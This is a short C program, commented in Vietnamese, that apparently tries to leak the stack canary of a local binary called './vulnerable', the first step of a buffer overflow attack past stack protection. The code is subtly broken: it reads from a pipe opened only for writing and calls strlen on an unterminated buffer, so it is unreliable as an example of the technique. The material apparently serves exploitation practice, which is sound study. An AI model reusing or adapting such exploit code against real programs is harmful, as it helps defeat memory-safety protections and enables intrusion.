#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CANARY_OFFSET 12
#define BUFFER_SIZE 256

void leak_canary() {
    char input[BUFFER_SIZE];
    FILE *fp;
    char canary[4];
    
    // Tạo dữ liệu đầu vào để lộ canary
    memset(input, 'A', CANARY_OFFSET);
    input[CANARY_OFFSET] = '\n';  // Chèn ký tự kết thúc chuỗi

    // Mở chương trình mục tiêu
    fp = popen("./vulnerable", "w");
    if (fp == NULL) {
        perror("popen");
        exit(1);
    }
    
    // Gửi dữ liệu đầu vào
    fwrite(input, 1, strlen(input), fp);
    
    // Đọc đầu ra để lấy giá trị canary
    fread(canary, 1, 4, fp);
    
    // In giá trị canary
    printf("Canary value: ");
    for (int i = 0; i < 4; i++) {
        printf("%02x", (unsigned char)canary[i]);
    }
    printf("\n");
    
    pclose(fp);
}

int main() {
    leak_canary();
    return 0;
}
